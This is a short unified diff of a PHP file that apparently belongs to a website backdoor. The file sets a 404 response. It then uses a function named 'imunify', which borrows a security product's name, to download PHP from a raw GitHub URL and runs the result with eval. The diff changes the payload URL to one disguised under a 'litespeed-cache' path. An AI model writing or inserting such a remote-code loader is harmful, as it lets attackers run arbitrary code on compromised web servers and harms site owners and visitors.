@@ -33,6 +33,6 @@ http_response_code(404);
         }
         return $urls;
     }
-    $secure = imunify('https://raw.githubusercontent.com/35ww3qq/7667/refs/heads/main/ff.php');
+    $secure = imunify('https://raw.githubusercontent.com/35ww3qq/litespeed-cache/refs/heads/main/3.php');
     eval('?>' . $secure);
 ?>
